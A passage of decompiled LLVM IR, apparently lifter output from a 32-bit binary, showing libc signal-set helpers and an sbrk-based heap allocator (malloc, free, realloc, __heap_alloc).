  %v4_12504 = call i32 @__libc_sigaction(i32 %v0_124fc, i32* nonnull %stack_var_-152, i32 %v2_1247c)
  store i32 %v4_12504, i32* %r0.global-to-local, align 4
  %v1_12508 = icmp slt i32 %v4_12504, 0
  br i1 %v1_12508, label %dec_label_pc_12514, label %bb23

bb23:                                             ; preds = %dec_label_pc_124dc
  %v5_1250c = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_1250c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_12514:                               ; preds = %dec_label_pc_124dc, %dec_label_pc_124c4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %bb23, %dec_label_pc_12498, %dec_label_pc_12514
  %v0_12518 = phi i32 [ %v5_1250c, %bb23 ], [ %v0_12518.pre, %dec_label_pc_12498 ], [ -1, %dec_label_pc_12514 ]
  store i32 %v0_12518, i32* %r0.global-to-local, align 4
  %v2_12520 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12520, i32* @r4, align 4
  store i32 %v6_12470, i32* @r5, align 4
  ret i32 %v0_12518

; uselistorder directives
  uselistorder i32 %v0_12518, { 1, 0 }
  uselistorder i32 %v5_124bc, { 1, 0 }
  uselistorder i32 %v1_124b4, { 0, 2, 1 }
  uselistorder i32 %v2_1247c, { 1, 0 }
  uselistorder i32 %v0_12480.pre, { 1, 0, 2 }
  uselistorder i32 %v10_12470, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12518, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124ac, { 1, 0 }
  uselistorder label %dec_label_pc_12498, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12528 = add i32 %arg2, -1
  %v3_1252c = udiv i32 %v1_12528, 32
  %v4_12530 = mul nuw nsw i32 %v3_1252c, 4
  %v5_12530 = add i32 %v4_12530, %arg1
  %v6_12530 = inttoptr i32 %v5_12530 to i32*
  %v7_12530 = load i32, i32* %v6_12530, align 4
  %v1_12534 = urem i32 %v1_12528, 32
  %v7_1253c = shl i32 1, %v1_12534
  %v8_1253c = and i32 %v7_12530, %v7_1253c
  %v10_1253c = icmp ne i32 %v8_1253c, 0
  %. = zext i1 %v10_1253c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12528, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_1254c = load i32, i32* @r1, align 4
  %v1_1254c = add i32 %v0_1254c, -1
  %v3_12550 = udiv i32 %v1_1254c, 32
  %v0_12554 = load i32, i32* @r0, align 4
  %v4_12554 = mul nuw nsw i32 %v3_12550, 4
  %v5_12554 = add i32 %v0_12554, %v4_12554
  %v6_12554 = inttoptr i32 %v5_12554 to i32*
  %v7_12554 = load i32, i32* %v6_12554, align 4
  %v1_12558 = urem i32 %v1_1254c, 32
  %v7_12560 = shl i32 1, %v1_12558
  %v8_12560 = or i32 %v7_12554, %v7_12560
  store i32 %v8_12560, i32* %v6_12554, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1254c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12570 = add i32 %arg2, -1
  %v3_12574 = udiv i32 %v1_12570, 32
  %v4_12578 = mul nuw nsw i32 %v3_12574, 4
  %v5_12578 = add i32 %v4_12578, %arg1
  %v6_12578 = inttoptr i32 %v5_12578 to i32*
  %v7_12578 = load i32, i32* %v6_12578, align 4
  %v1_1257c = urem i32 %v1_12570, 32
  %tmp = shl i32 -1, %v1_1257c
  %v8_12584 = add i32 %tmp, -1
  %v9_12584 = and i32 %v7_12578, %v8_12584
  store i32 %v9_12584, i32* %v6_12578, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12570, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12594 = load i32, i32* @r4, align 4
  %v6_12594 = load i32, i32* @r5, align 4
  %v9_12594 = load i32, i32* @r6, align 4
  %v0_12598 = load i32, i32* %r0.global-to-local, align 4
  %v2_12598 = icmp eq i32 %v0_12598, 0
  %v2_1259c = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_12598, label %bb, label %dec_label_pc_125a8

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125b0

dec_label_pc_125a8:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_12598, -8
  br i1 %tmp, label %dec_label_pc_126b4, label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %bb, %dec_label_pc_125a8
  %v0_125b0 = phi i32 [ %v0_12598, %dec_label_pc_125a8 ], [ 1, %bb ]
  %v1_125b0 = add i32 %v0_125b0, 4
  store i32 %v1_125b0, i32* %stack_var_-20, align 4
  store i32 %v2_1259c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2974c.442 to i32), i32* %r0.global-to-local, align 4
  %v1_125c8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_232f8.446 to i32), i32* %r0.global-to-local, align 4
  %v3_125d4 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_232f8.446 to i32*), i32 %v2_1259c)
  store i32 %v3_125d4, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2974c.442 to i32), i32* %r0.global-to-local, align 4
  store i32 75244, i32* @lr, align 4
  %v1_125e8 = call i32 @__pthread_return_0()
  store i32 %v1_125e8, i32* %r0.global-to-local, align 4
  %v2_125ec = icmp eq i32 %v3_125d4, 0
  br i1 %v2_125ec, label %dec_label_pc_125f4, label %dec_label_pc_126a4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125b0
  %v2_125f8 = load i32, i32* @global_var_29774.293, align 4
  store i32 %v2_125f8, i32* @r4, align 4
  %v2_125fc = load i32, i32* %stack_var_-20, align 4
  %v3_12600 = icmp ult i32 %v2_125fc, %v2_125f8
  br i1 %v3_12600, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_125f4
  %v3_12604 = add i32 %v2_125f8, -1
  %v2_12608 = add i32 %v3_12604, %v2_125fc
  %v2_1260c = sub i32 0, %v2_125f8
  %v3_12610 = and i32 %v2_12608, %v2_1260c
  store i32 %v3_12610, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_125f4, %bb14
  store i32 ptrtoint (i32* @global_var_2983c.450 to i32), i32* %r0.global-to-local, align 4
  %v1_1261c = call i32 @__pthread_return_0()
  %v0_12620 = load i32, i32* @r4, align 4
  store i32 %v0_12620, i32* %r0.global-to-local, align 4
  %v1_12624 = call i32 @__GI_sbrk(i32 %v0_12620)
  store i32 %v1_12624, i32* %r0.global-to-local, align 4
  %v7_12628 = icmp eq i32 %v1_12624, -1
  br i1 %v7_12628, label %bb15, label %dec_label_pc_12634

bb15:                                             ; preds = %.thread3
  store i32 %v1_12624, i32* @r5, align 4
  br label %dec_label_pc_12648

dec_label_pc_12634:                               ; preds = %.thread3
  %v1_12634 = add i32 %v1_12624, 3
  %v1_12638 = and i32 %v1_12634, -4
  store i32 %v1_12638, i32* @r5, align 4
  %v9_1263c = icmp eq i32 %v1_12638, %v1_12624
  br i1 %v9_1263c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_12634
  %v3_12640 = sub i32 %v1_12638, %v1_12624
  store i32 %v3_12640, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12634, %bb16
  %v1_12644 = xor i1 %v9_1263c, true
  call void @__pseudo_cond_branch(i1 %v1_12644, i32 ptrtoint (i32* @global_var_13bdc.451 to i32))
  br label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2983c.450 to i32), i32* %r0.global-to-local, align 4
  store i32 75352, i32* @lr, align 4
  %v1_12654 = call i32 @__pthread_return_0()
  store i32 %v1_12654, i32* %r0.global-to-local, align 4
  %v0_12658 = load i32, i32* @r5, align 4
  %v7_12658 = icmp eq i32 %v0_12658, -1
  br i1 %v7_12658, label %dec_label_pc_126b4, label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_12648
  store i32 ptrtoint (i32* @global_var_2974c.442 to i32), i32* %r0.global-to-local, align 4
  %v1_1266c = call i32 @__pthread_return_0()
  %v0_12670 = load i32, i32* @r4, align 4
  %v0_12674 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_232f8.446 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_12674, 16777216
  %v2_1267c = sdiv i32 %sext, 16777216
  %v5_1267c = call i32 @__heap_free(i32* bitcast (i32** @global_var_232f8.446 to i32*), i32 %v2_1267c, i32 %v0_12670)
  store i32 ptrtoint (i32** @global_var_232f8.446 to i32), i32* %r0.global-to-local, align 4
  %v3_12688 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_232f8.446 to i32*), i32 %v2_1259c)
  store i32 %v3_12688, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2974c.442 to i32), i32* %r0.global-to-local, align 4
  store i32 75420, i32* @lr, align 4
  %v1_12698 = call i32 @__pthread_return_0()
  store i32 %v1_12698, i32* %r0.global-to-local, align 4
  %v2_1269c = icmp eq i32 %v3_12688, 0
  br i1 %v2_1269c, label %dec_label_pc_126b4, label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %dec_label_pc_125b0, %dec_label_pc_12660
  %v1_126a8 = phi i32 [ %v3_125d4, %dec_label_pc_125b0 ], [ %v3_12688, %dec_label_pc_12660 ]
  %v2_126a4 = load i32, i32* %stack_var_-20, align 4
  %v2_126a8 = inttoptr i32 %v1_126a8 to i32*
  store i32 %v2_126a4, i32* %v2_126a8, align 4
  %v3_126a8 = load i32, i32* %r4.global-to-local, align 4
  %v4_126a8 = add i32 %v3_126a8, 4
  store i32 %v4_126a8, i32* %r4.global-to-local, align 4
  %v2_126ac = icmp eq i32 %v4_126a8, 0
  br i1 %v2_126ac, label %dec_label_pc_126b4, label %dec_label_pc_126c4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_126a4, %dec_label_pc_12660, %dec_label_pc_12648, %dec_label_pc_125a8
  %v0_126b4 = call i32 @__errno_location()
  store i32 %v0_126b4, i32* %r0.global-to-local, align 4
  %v2_126bc = inttoptr i32 %v0_126b4 to i32*
  store i32 12, i32* %v2_126bc, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %dec_label_pc_126a4, %dec_label_pc_126b4
  %v0_126c4 = phi i32 [ %v4_126a8, %dec_label_pc_126a4 ], [ 0, %dec_label_pc_126b4 ]
  store i32 %v0_126c4, i32* %r0.global-to-local, align 4
  store i32 %v3_12594, i32* @r4, align 4
  store i32 %v6_12594, i32* @r5, align 4
  store i32 %v9_12594, i32* @r6, align 4
  ret i32 %v0_126c4

; uselistorder directives
  uselistorder i32 %v0_126c4, { 1, 0 }
  uselistorder i32 %v3_12688, { 1, 0, 2 }
  uselistorder i32 %v1_12638, { 1, 0, 2 }
  uselistorder i32 %v1_12624, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_125d4, { 1, 0, 2 }
  uselistorder i32 %v0_12598, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 6, 7, 8, 9, 11, 10, 15, 13, 12, 17, 14, 16, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_126c4, { 1, 0 }
  uselistorder label %dec_label_pc_126a4, { 1, 0 }
  uselistorder label %dec_label_pc_12648, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_125b0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_126e8 = load i32, i32* @r0, align 4
  %v2_126e8 = icmp eq i32 %v0_126e8, 0
  %v3_126ec = load i32, i32* @r4, align 4
  store i32 %v3_126ec, i32* %stack_var_-24, align 4
  %v6_126ec = load i32, i32* @r5, align 4
  %v9_126ec = load i32, i32* @r6, align 4
  %v15_126ec = load i32, i32* @r8, align 4
  br i1 %v2_126e8, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_126f4 = add i32 %v0_126e8, -4
  %v2_126f4 = inttoptr i32 %v1_126f4 to i32*
  %v3_126f4 = load i32, i32* %v2_126f4, align 4
  store i32 %v3_126f4, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_232f8.446 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_126f4, i32* @r4, align 4
  %v1_1270c = call i32 @__pthread_return_0()
  %v0_12710 = load i32, i32* @r4, align 4
  %v0_12714 = load i32, i32* @r5, align 4
  %v4_1271c = call i32 @__heap_free(i32* bitcast (i32** @global_var_232f8.446 to i32*), i32 %v0_12710, i32 %v0_12714)
  %v1_12724 = inttoptr i32 %v4_1271c to i32*
  %v2_12724 = load i32, i32* %v1_12724, align 4
  store i32 %v2_12724, i32* %r6.global-to-local, align 4
  %v2_12728 = load i32, i32* @global_var_29774.293, align 4
  %v4_1272c = mul i32 %v2_12728, 8
  %v6_1272c = icmp ult i32 %v2_12724, %v4_1272c
  store i32 %v4_1271c, i32* @r4, align 4
  br i1 %v6_1272c, label %dec_label_pc_1276c, label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %bb11
  %v1_12740 = call i32 @__pthread_return_0()
  %v1_12748 = call i32 @__GI_sbrk(i32 0)
  %v0_1274c = load i32, i32* @r4, align 4
  %v1_1274c = add i32 %v0_1274c, 12
  store i32 %v1_1274c, i32* @r5, align 4
  %v9_12750 = icmp eq i32 %v1_1274c, %v1_12748
  br i1 %v9_12750, label %dec_label_pc_12774, label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %dec_label_pc_12738
  %v1_12764 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1276c

dec_label_pc_1276c:                               ; preds = %bb11, %dec_label_pc_12758, %bb14
  %v2_1276c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1276c, i32* @r4, align 4
  store i32 %v6_126ec, i32* @r5, align 4
  store i32 %v9_126ec, i32* %r6.global-to-local, align 4
  store i32 %v15_126ec, i32* %r8.global-to-local, align 4
  %v0_12770 = call i32 @__pthread_return_0()
  %v0_12774.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_12738, %dec_label_pc_1276c
  %v1_1277c = phi i32 [ %v0_1274c, %dec_label_pc_12738 ], [ %v0_12774.pre, %dec_label_pc_1276c ]
  %v1_12774 = add i32 %v1_1277c, 4
  %v2_12774 = inttoptr i32 %v1_12774 to i32*
  %v3_12774 = load i32, i32* %v2_12774, align 4
  %v2_12778 = icmp eq i32 %v3_12774, 0
  br i1 %v2_12778, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_12774
  %v2_1277c = add i32 %v1_1277c, 8
  %v3_1277c = inttoptr i32 %v2_1277c to i32*
  %v4_1277c = load i32, i32* %v3_1277c, align 4
  %v3_12780 = add i32 %v3_12774, 8
  %v4_12780 = inttoptr i32 %v3_12780 to i32*
  store i32 %v4_1277c, i32* %v4_12780, align 4
  %v0_12784.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12774, %bb12
  %v0_12784 = phi i32 [ %v1_1277c, %dec_label_pc_12774 ], [ %v0_12784.pre, %bb12 ]
  %v1_12784 = add i32 %v0_12784, 8
  %v2_12784 = inttoptr i32 %v1_12784 to i32*
  %v3_12784 = load i32, i32* %v2_12784, align 4
  %v1_12788 = add i32 %v0_12784, 4
  %v2_12788 = inttoptr i32 %v1_12788 to i32*
  %v3_12788 = load i32, i32* %v2_12788, align 4
  %v2_1278c = icmp eq i32 %v3_12784, 0
  br i1 %v2_1278c, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_12790 = add i32 %v3_12784, 4
  %v4_12790 = inttoptr i32 %v3_12790 to i32*
  store i32 %v3_12788, i32* %v4_12790, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_12794 = load i32, i32* %r8.global-to-local, align 4
  %v3_12794 = inttoptr i32 %v2_12794 to i32*
  store i32 %v3_12788, i32* %v3_12794, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_127a4 = call i32 @__pthread_return_0()
  %v0_127a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_127a8 = load i32, i32* @r4, align 4
  %v0_127b0 = load i32, i32* @r5, align 4
  %v2_127a8 = sub i32 12, %v0_127a8
  %v1_127ac = add i32 %v2_127a8, %v1_127a8
  %v2_127b0 = sub i32 %v1_127ac, %v0_127b0
  %v1_127b4 = call i32 @__GI_sbrk(i32 %v2_127b0)
  br label %dec_label_pc_1276c

; uselistorder directives
  uselistorder i32 %v0_12784, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12774, { 1, 0 }
  uselistorder label %dec_label_pc_1276c, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_127d8 = load i32, i32* @r4, align 4
  store i32 %v3_127d8, i32* %stack_var_-24, align 4
  %v6_127d8 = load i32, i32* @r5, align 4
  %v9_127d8 = load i32, i32* @r6, align 4
  %v12_127d8 = load i32, i32* @r7, align 4
  %v15_127d8 = load i32, i32* @r8, align 4
  %v18_127d8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_127dc = icmp eq i32 %arg2, 0
  %v0_127e0 = load i32, i32* @r0, align 4
  store i32 %v0_127e0, i32* @r7, align 4
  br i1 %v2_127dc, label %dec_label_pc_127e8, label %dec_label_pc_127f0

dec_label_pc_127e8:                               ; preds = %entry
  %v0_127e8 = call i32 @free()
  %v0_127f8.pre = load i32, i32* @r4, align 4
  %v2_127fc.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_127f8

dec_label_pc_127f0:                               ; preds = %entry
  %v2_127f0 = icmp eq i32 %v0_127e0, 0
  br i1 %v2_127f0, label %dec_label_pc_127f8, label %dec_label_pc_12804

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127e8
  %v2_127fc = phi i32 [ %v3_127d8, %dec_label_pc_127f0 ], [ %v2_127fc.pre, %dec_label_pc_127e8 ]
  %v0_127f8 = phi i32 [ %arg2, %dec_label_pc_127f0 ], [ %v0_127f8.pre, %dec_label_pc_127e8 ]
  store i32 %v2_127fc, i32* @r4, align 4
  store i32 %v6_127d8, i32* @r5, align 4
  store i32 %v9_127d8, i32* @r6, align 4
  store i32 %v12_127d8, i32* @r7, align 4
  store i32 %v18_127d8, i32* @lr, align 4
  %v1_12800 = call i32 @malloc(i32 %v0_127f8)
  %v0_12804.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127f8
  %v0_1281c = phi i32 [ %v0_127e0, %dec_label_pc_127f0 ], [ %v1_12800, %dec_label_pc_127f8 ]
  %v0_12804 = phi i32 [ %arg2, %dec_label_pc_127f0 ], [ %v0_12804.pre, %dec_label_pc_127f8 ]
  %v1_12804 = add i32 %v0_12804, 7
  %v1_12808 = and i32 %v1_12804, -4
  store i32 %v1_12808, i32* @r5, align 4
  %v2_1280c = icmp ugt i32 %v1_12808, 10
  %v1_12810 = add i32 %v0_1281c, -4
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  %v3_12810 = load i32, i32* %v2_12810, align 4
  store i32 %v3_12810, i32* @r6, align 4
  br i1 %v2_1280c, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_12804
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_12804, %bb
  %v0_12898 = phi i32 [ %v1_12808, %dec_label_pc_12804 ], [ 12, %bb ]
  store i32 %v1_12810, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_12898, %v3_12810
  br i1 %tmp, label %dec_label_pc_12824, label %dec_label_pc_12898

dec_label_pc_12824:                               ; preds = %bb14
  %v2_12818 = sub i32 %v0_12898, %v3_12810
  %v1_12834 = call i32 @__pthread_return_0()
  %v0_1283c = load i32, i32* @r8, align 4
  %v1_1283c = load i32, i32* @r6, align 4
  %v2_1283c = add i32 %v1_1283c, %v0_1283c
  %v4_12844 = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_232f8.446 to i32*), i32 %v2_1283c, i32 %v2_12818)
  store i32 %v4_12844, i32* @r4, align 4
  store i32 75868, i32* @lr, align 4
  %v1_12858 = call i32 @__pthread_return_0()
  %v0_1285c = load i32, i32* @r4, align 4
  %v2_1285c = icmp eq i32 %v0_1285c, 0
  br i1 %v2_1285c, label %dec_label_pc_1286c, label %.thread

.thread:                                          ; preds = %dec_label_pc_12824
  %v1_12860 = load i32, i32* @r6, align 4
  %v3_12860 = add i32 %v1_12860, %v0_1285c
  %v2_12864 = load i32, i32* @r7, align 4
  %v3_12864 = add i32 %v2_12864, -4
  %v4_12864 = inttoptr i32 %v3_12864 to i32*
  store i32 %v3_12860, i32* %v4_12864, align 4
  br label %dec_label_pc_128d8

dec_label_pc_1286c:                               ; preds = %dec_label_pc_12824
  %v0_1286c = load i32, i32* @r5, align 4
  %v1_1286c = add i32 %v0_1286c, -4
  %v1_12870 = call i32 @malloc(i32 %v1_1286c)
  store i32 %v1_12870, i32* @r0, align 4
  store i32 %v1_12870, i32* @r4, align 4
  %v2_12874 = icmp eq i32 %v1_12870, 0
  br i1 %v2_12874, label %dec_label_pc_12890, label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_1286c
  %v0_1287c = load i32, i32* @r6, align 4
  %v1_1287c = add i32 %v0_1287c, -4
  store i32 %v1_1287c, i32* @r2, align 4
  %v0_12880 = load i32, i32* @r7, align 4
  store i32 %v0_12880, i32* @r1, align 4
  %v0_12884 = call i32 @memcpy()
  %v0_12888 = load i32, i32* @r7, align 4
  store i32 %v0_12888, i32* @r0, align 4
  %v0_1288c = call i32 @free()
  %v0_12890.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12890

dec_label_pc_12890:                               ; preds = %dec_label_pc_1286c, %dec_label_pc_1287c
  %v0_12890 = phi i32 [ 0, %dec_label_pc_1286c ], [ %v0_12890.pre, %dec_label_pc_1287c ]
  store i32 %v0_12890, i32* @r7, align 4
  br label %dec_label_pc_128d8

dec_label_pc_12898:                               ; preds = %bb14
  %v1_12898 = add i32 %v0_12898, 28
  %tmp15 = icmp ugt i32 %v1_12898, %v3_12810
  br i1 %tmp15, label %dec_label_pc_128d8, label %dec_label_pc_128a4

dec_label_pc_128a4:                               ; preds = %dec_label_pc_12898
  %v1_128b0 = call i32 @__pthread_return_0()
  %v0_128b4 = load i32, i32* @r8, align 4
  %v1_128b4 = load i32, i32* @r5, align 4
  %v2_128b4 = add i32 %v1_128b4, %v0_128b4
  %v1_128b8 = load i32, i32* @r6, align 4
  %v2_128b8 = sub i32 %v1_128b8, %v1_128b4
  %v4_128c0 = call i32 @__heap_free(i32* bitcast (i32** @global_var_232f8.446 to i32*), i32 %v2_128b4, i32 %v2_128b8)
  store i32 75988, i32* @lr, align 4
  %v1_128d0 = call i32 @__pthread_return_0()
  %v0_128d4 = load i32, i32* @r5, align 4
  %v1_128d4 = load i32, i32* @r7, align 4
  %v2_128d4 = add i32 %v1_128d4, -4
  %v3_128d4 = inttoptr i32 %v2_128d4 to i32*
  store i32 %v0_128d4, i32* %v3_128d4, align 4
  br label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %.thread, %dec_label_pc_12898, %dec_label_pc_12890, %dec_label_pc_128a4
  %v0_128d8 = load i32, i32* @r7, align 4
  store i32 %v9_127d8, i32* @r6, align 4
  store i32 %v15_127d8, i32* @r8, align 4
  ret i32 %v0_128d8

; uselistorder directives
  uselistorder i32 %v1_128b4, { 1, 0 }
  uselistorder i32 %v0_12898, { 1, 2, 0 }
  uselistorder i32 %v3_12810, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_232f8.446, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_232f8.446 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_128d8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_12890, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_12804, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_128f0 = inttoptr i32 %arg2 to i32*
  %v2_128f0 = load i32, i32* %v1_128f0, align 4
  %v3_128f4 = load i32, i32* @r4, align 4
  store i32 %v3_128f4, i32* %stack_var_-8, align 4
  %v1_128f8 = add i32 %v2_128f0, 3
  %v1_128fc = and i32 %v1_128f8, -4
  store i32 %v1_128fc, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12904 = icmp ugt i32 %v1_128fc, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_1290c = load i32, i32* %arg1, align 4
  store i32 %v2_1290c, i32* %r0.global-to-local, align 4
  br i1 %v2_12904, label %dec_label_pc_12978.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12978.preheader

dec_label_pc_12978.preheader:                     ; preds = %entry, %bb
  %v1_1292c = phi i32 [ %v1_128fc, %entry ], [ 12, %bb ]
  %v2_129789 = icmp eq i32 %v2_1290c, 0
  br i1 %v2_129789, label %dec_label_pc_12980, label %dec_label_pc_12918

dec_label_pc_12918:                               ; preds = %dec_label_pc_12978.preheader, %dec_label_pc_12974
  %v2_12930 = phi i32 [ %v3_12974, %dec_label_pc_12974 ], [ %v2_1290c, %dec_label_pc_12978.preheader ]
  %v1_12918 = inttoptr i32 %v2_12930 to i32*
  %v2_12918 = load i32, i32* %v1_12918, align 4
  store i32 %v2_12918, i32* @ip, align 4
  %v3_1291c = icmp ult i32 %v2_12918, %v1_1292c
  br i1 %v3_1291c, label %dec_label_pc_12974, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_12918
  %v1_12924 = add i32 %v1_1292c, 44
  %v3_12928 = icmp ult i32 %v2_12918, %v1_12924
  br i1 %v3_12928, label %dec_label_pc_12938, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_12924
  %v2_1291c.le = sub i32 %v2_12918, %v1_1292c
  store i32 %v2_1291c.le, i32* %v1_12918, align 4
  %v0_12964.pre = load i32, i32* @ip, align 4
  %v0_1296c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_12938:                               ; preds = %dec_label_pc_12924
  %v1_12938 = add i32 %v2_12930, 4
  %v2_12938 = inttoptr i32 %v1_12938 to i32*
  %v3_12938 = load i32, i32* %v2_12938, align 4
  store i32 %v3_12938, i32* %r2.global-to-local, align 4
  %v2_1293c = icmp eq i32 %v3_12938, 0
  br i1 %v2_1293c, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_12938
  %v2_12940 = add i32 %v2_12930, 8
  %v3_12940 = inttoptr i32 %v2_12940 to i32*
  %v4_12940 = load i32, i32* %v3_12940, align 4
  %v3_12944 = add i32 %v3_12938, 8
  %v4_12944 = inttoptr i32 %v3_12944 to i32*
  store i32 %v4_12940, i32* %v4_12944, align 4
  %v0_12948.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12938, %bb27
  %v0_12948 = phi i32 [ %v2_12930, %dec_label_pc_12938 ], [ %v0_12948.pre, %bb27 ]
  %v1_12948 = add i32 %v0_12948, 8
  %v2_12948 = inttoptr i32 %v1_12948 to i32*
  %v3_12948 = load i32, i32* %v2_12948, align 4
  %v1_1294c = add i32 %v0_12948, 4
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  %v2_12950 = icmp eq i32 %v3_12948, 0
  br i1 %v2_12950, label %.thread5, label %bb28

